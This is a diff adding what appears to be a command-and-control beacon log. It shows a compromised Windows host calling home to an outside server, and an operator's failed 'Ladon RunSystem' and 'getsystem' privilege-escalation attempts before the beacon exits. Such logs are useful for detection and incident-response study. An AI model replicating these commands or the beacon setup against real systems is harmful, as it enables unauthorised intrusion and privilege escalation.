@@ -1,0 +1,17 @@
+12/13 18:18:49 UTC [metadata] 180.157.21.223 <- 192.168.37.130; computer: DESKTOP-U2TRCVA; user: jhc; process: NewArtifact.exe; pid: 7676; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/13 18:24:07 UTC [output]
+Ladon RunSystem 
+
+12/13 18:24:07 UTC [error] Ladon.exe does not exist :(
+12/13 18:24:13 UTC [input] <jhc> getsystem
+12/13 18:24:13 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/13 18:24:14 UTC [checkin] host called home, sent: 2743 bytes
+12/13 18:24:14 UTC [output]
+received output:
+getsystem failed.
+
+12/13 18:41:59 UTC [metadata] 180.157.21.223 <- 192.168.37.130; computer: DESKTOP-U2TRCVA; user: jhc; process: NewArtifact.exe; pid: 7676; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/13 18:41:51 UTC [checkin] host called home, sent: 8 bytes
+12/13 18:41:52 UTC [output]
+beacon exit.
+
